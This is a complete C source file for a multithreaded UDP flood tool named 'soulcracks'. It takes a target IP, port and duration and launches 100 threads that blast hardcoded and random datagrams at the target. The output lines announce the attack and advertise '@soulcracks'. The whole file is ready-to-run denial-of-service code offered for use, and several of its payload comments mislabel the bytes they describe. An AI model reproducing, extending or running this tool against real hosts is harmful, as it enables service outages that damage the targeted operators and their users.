#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define MAX_PAYLOAD_SIZE 2048 // Increased maximum payload size
#define THREAD_COUNT 100      // Set the number of threads to 100

void usage() {
    printf("Usage: ./soulcracks ip port time\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

// Some hardcoded, "hard" payloads, representing larger and more complex data
char *hard_payloads[] = {
    "\x45\x00\x00\x3c\x1c\x46\x40\x00\x40\x06\xb1\xe6\xc0\xa8\x00\x68\xc0\xa8\x00\x01", // Simulates part of an IP header
    "\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03\x5e\x55\xb2\xb0\x01\x15\x6b\x2e",     // Simulates part of a TLS handshake
    "\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00", // Large NULL byte sequence
    "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff", // Flood with max bytes
    "\x01\x00\x00\x00\x03\x00\x00\x00\x09\x00\x00\x00\x05\x00\x00\x00\x04\x00\x00\x00\x0d\x00", // Mimic random protocol-like data
    "\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x00\x00\x20\x01", // Fake DNS query for "www.google.com"
    "\x72\xfe\x1d\x13\x00\x00", // Random binary junk data
    "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00", // LDAP request-like payload
    "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31", // Fake SNMP request payload
    "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31", // HTTP GET request flood
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    char payload[MAX_PAYLOAD_SIZE];
    int hard_payload_count = sizeof(hard_payloads) / sizeof(hard_payloads[0]);
    
    // Randomize seed for generating dynamic payloads
    srand(time(NULL));

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        // Alternating between hardcoded payloads and randomized payloads
        if (rand() % 2 == 0) {
            // Use a random hardcoded payload
            int idx = rand() % hard_payload_count;
            if (sendto(sock, hard_payloads[idx], strlen(hard_payloads[idx]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        } else {
            // Use randomized payloads
            int payload_size = rand() % (MAX_PAYLOAD_SIZE - 512) + 512; // Payload size from 512 to 2048 bytes
            for (int i = 0; i < payload_size; i++) {
                payload[i] = rand() % 256; // Random byte value from 0 to 255
            }
            if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    pthread_t thread_ids[THREAD_COUNT];
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, THREAD_COUNT);

    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        printf("Launched thread with ID: Soulcracks %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("Attack finished join @soulcracks\n");
    return 0;
}